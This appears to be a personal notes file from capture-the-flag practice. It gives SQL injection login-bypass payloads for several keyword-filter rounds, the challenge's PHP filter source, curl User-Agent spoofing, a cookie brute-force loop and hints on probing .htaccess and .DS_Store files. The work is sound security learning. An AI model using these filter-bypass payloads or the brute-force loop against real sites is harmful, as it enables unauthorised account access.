Find all instances of a text line files in current and all subdirectories

grep -r "test"


## SQL injection (sqlite)

`SELECT * FROM user WHERE username='<u>' AND password='<p>'`

Task is to login as admin (known username as `admin`) with the following restriction:

1. `or`
u: admin' --
p: (doesn't matter because commented out with --)

2. `or` `and` `like` `=` `--`

u: admin'; #
p: (doesn't materr because commented out with #)

3. `or` `and` `=` `like` `>` `<` `--` (I suspect also `#`)

u: admin';
p: (doesn't matter because statment has been ended)

4 `or` `and` `=` `like` `>` `<` `--` `admin` + common filters (whitespace!)

my idea: concat!

u: ad'||'min';
p: (doesn't matter because statement has ended)

alternative:

u: ad/\*\*/min';  (`ad/**/min';`)

u: blah'/\*\*/union/\*\*/select/\*\*/*/\*\*/from/\*\*/users/\*\*/limit/\*\*/1;
(`blah'/*\*/union/**/select/**/*/**/from/**/users/**/limit/**/1;`)

5. `or` `and` `=` `like` `>` `<` `--` `admin` `union` + common filters (whitespace!)

All Filters:

```php
<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}
?>
```

## User-Agent control ##

one challenge in picoCTF has you click a button `flag` (leading to the `/flag` page) but clicking it gives "you're not picobrowser! 


I've seen this before, the referrer is what they're asking about. Here's the raw curl request:

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/28921/flag' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Mobile Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Referer: https://jupiter.challenges.picoctf.org/problem/28921/flag' \
  -H 'Accept-Language: en-US,en;q=0.9,fr;q=0.8,es;q=0.7' \
  -H 'Cookie: PHPSESSID=rinmbr5fv8gekg81vitj13cj5s' \
  --compressed
```
Deleting all the uneccesary garbage and changing the user-agent:

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/28921/flag' \
  -H 'User-Agent: picobrowser' \
```

Full disclosure: I thought at first it was the referer, but that's involved with redirects. Random facts which may be useful. Whenever your security doesn't change or is upgraded (HTTP -> HTTP, HTTPS -> HTTPS, HTTP -> HTTPS) a referrer is tagged on. But whenever you downgrade (HTTPS -> HTTP) referrer coems back as empty. Another use for changing the user-agent is to have the interface change as if you were a mobile device (useful as a developer for sure)


Get header info with curl:

`curl -I http://mercury.picoctf.net:47967/`

brute force a cookie
```bash
for f in {1..100}
do
        echo $f
curl --silent 'http://mercury.picoctf.net:27177/check' \
  -H "Cookie: name=$f" | grep "pico"
done
```

Apache Server 

The congiguration file is `.htaccess`, searching for it in the url may be helpful. If the host machine is a Mac, a `.DS_Store` may also be available. This file typically stores custom attributes (background image, icon position, etc.) This is similart o Windows' `desktop.ini`.
